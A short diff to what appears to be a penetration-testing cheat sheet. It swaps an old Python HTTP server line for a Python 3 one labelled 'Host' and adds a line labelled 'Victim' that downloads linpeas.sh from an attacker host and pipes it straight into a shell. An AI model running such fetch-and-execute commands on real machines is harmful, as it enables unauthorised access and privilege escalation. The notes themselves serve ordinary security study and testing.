@@ -111,7 +111,9 @@ https://www.rapid7.com/db/
 - Also use `searchsploit` for offline search of exploit
 
 ```shell
-python -m SimpleHTTPServer 80
+# Local network
+sudo python3 -m http.server 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
 ```
 
 ```shell
